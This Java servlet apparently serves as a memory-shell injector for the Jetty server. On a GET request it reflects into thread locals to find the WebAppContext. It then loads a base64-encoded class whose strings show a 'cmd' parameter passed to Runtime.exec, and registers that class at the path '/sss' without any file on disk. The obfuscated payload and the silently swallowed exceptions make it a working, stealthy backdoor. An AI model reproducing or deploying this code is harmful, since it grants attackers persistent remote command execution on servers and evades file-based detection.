package test;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class InjectServletByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object var1 = getContext();
            injectMemShell(var1);
        } catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Thread thread=Thread.currentThread();
        Field f1=thread.getClass().getDeclaredField("threadLocals");
        f1.setAccessible(true);
        Object o1=f1.get(thread);
        Field f2=o1.getClass().getDeclaredField("table");
        f2.setAccessible(true);
        Object o3=f2.get(o1);

        Class var7 = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        Field var8 = var7.getDeclaredField("value");
        var8.setAccessible(true);
        Object var9 = null;
//        ThreadLocal.ThreadLocalMap.Entry[] o3=(ThreadLocal.ThreadLocalMap.Entry[]) f2.get(o1);

        for(int var11 = 0; var11 < Array.getLength(o3); ++var11) {
            Object var10 = Array.get(o3, var11);
            if (var10 != null) {
                var9 = var8.get(var10);
                if (var9 != null && var9.getClass().getName().equals("org.eclipse.jetty.webapp.WebAppContext$Context")) {
                    Field f3=var9.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object o4=f3.get(var9);
                    return o4; //WebAppContext
                }
            }
        }
        return null;
    }

    public static synchronized void injectMemShell(Object context){
        try{
            Object MEMSHELL_OBJECT=injectMemShellClass();
            Class var2 = Thread.currentThread().getContextClassLoader().loadClass(MEMSHELL_OBJECT.getClass().getName());


            Field f1=context.getClass().getSuperclass().getDeclaredField("_servletHandler");
            f1.setAccessible(true);
            Object servletHandler=f1.get(context);

            Method var3 = servletHandler.getClass().getDeclaredMethod("addServletWithMapping", Class.class, String.class);
            var3.setAccessible(true);
            var3.invoke(servletHandler, var2, "/sss");
            // WebAppContext -> ServletContextHandler -> ContextHandler
        }catch(Exception e){

        }
    }

    public static Object injectMemShellClass() {
        try {
            Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var1.setAccessible(true);
            byte[] var2 = (new BASE64Decoder()).decodeBuffer("yv66vgAAADQAkAoAHABYBwBZBwBaCABbCwACAFwKABsAXQsAAwBeCgBfAGAHAGEKAGIAYwoAYgBkCgBlAGYHAGcKAA0AaAcAaQoADwBqBwBrCgARAFgKAA8AbAcAbQoAFABYCgAUAG4IAG8KABQAcAoAEQBxCgARAHAHAHIHAHMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xNeVNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAdAEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBAA1TdGFja01hcFRhYmxlBwByBwB1BwB2BwBZBwBaBwB3BwBhBwB4AQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAHkHAHoHAHsHAGcHAGkHAGsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEADk15U2VydmxldC5qYXZhDAAdAB4BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAdzZXJ2bGV0DAB8AEEMAEAAQQwAfQB+BwB/DACAAIEBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwB5DACCAIMMAIQAhQcAegwAhgCHAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAHQCIAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAHQCJAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAigCLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAIwAjQEAAQoMAI4AiwwAjACPAQAJTXlTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAbABwAAAAAAAUAAQAdAB4AAQAfAAAALwABAAEAAAAFKrcAAbEAAAACACAAAAAGAAEAAAANACEAAAAMAAEAAAAFACIAIwAAAAEAJAAlAAIAHwAAADUAAAACAAAAAbEAAAACACAAAAAGAAEAAAAPACEAAAAWAAIAAAABACIAIwAAAAAAAQAmACcAAQAoAAAABAABACkAAQAqACsAAgAfAAAA3gACAAcAAAAvK8AAAk4swAADOgQtEgS5AAUCADoFKhkFtgAGOgYZBLkABwEAGQa2AAinAAU6BrEAAQAVACkALAAJAAMAIAAAACIACAAAABIABQATAAsAFAAVABcAHQAYACkAGgAsABkALgAcACEAAABIAAcAHQAMACwALQAGAAAALwAiACMAAAAAAC8ALgAvAAEAAAAvADAAMQACAAUAKgAyADMAAwALACQANAA1AAQAFQAaADYALQAFADcAAAAfAAL/ACwABgcAOAcAOQcAOgcAOwcAPAcAPQABBwA+AQAoAAAABgACACkAPwABAEAAQQACAB8AAAEpAAMACQAAAGC4AApNLCu2AAtOLbYADDoEuwANWRkEtwAOOgW7AA9ZGQW3ABA6BgE6B7sAEVm3ABI6CBkGtgATWToHxgAgGQi7ABRZtwAVGQe2ABYSF7YAFrYAGLYAGVen/9sZCLYAGrAAAAADACAAAAAqAAoAAAAfAAQAIAAKACEAEAAiABsAIwAmACQAKQAlADIAJwA9ACgAWgArACEAAABcAAkAAABgACIAIwAAAAAAYAA2AC0AAQAEAFwAQgBDAAIACgBWAEQARQADABAAUABGAEcABAAbAEUASABJAAUAJgA6AEoASwAGACkANwBMAC0ABwAyAC4ATQBOAAgANwAAACUAAv8AMgAJBwA4BwA9BwBPBwBQBwBRBwBSBwBTBwA9BwBUAAAnACgAAAAEAAEACQABAFUAHgABAB8AAAArAAAAAQAAAAGxAAAAAgAgAAAABgABAAAALwAhAAAADAABAAAAAQAiACMAAAABAFYAAAACAFc=");
            Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            Object MEMSHELL_OBJECT = var3.newInstance();
            return MEMSHELL_OBJECT;
        } catch (Exception var4) {
        }
        return null;
    }
}
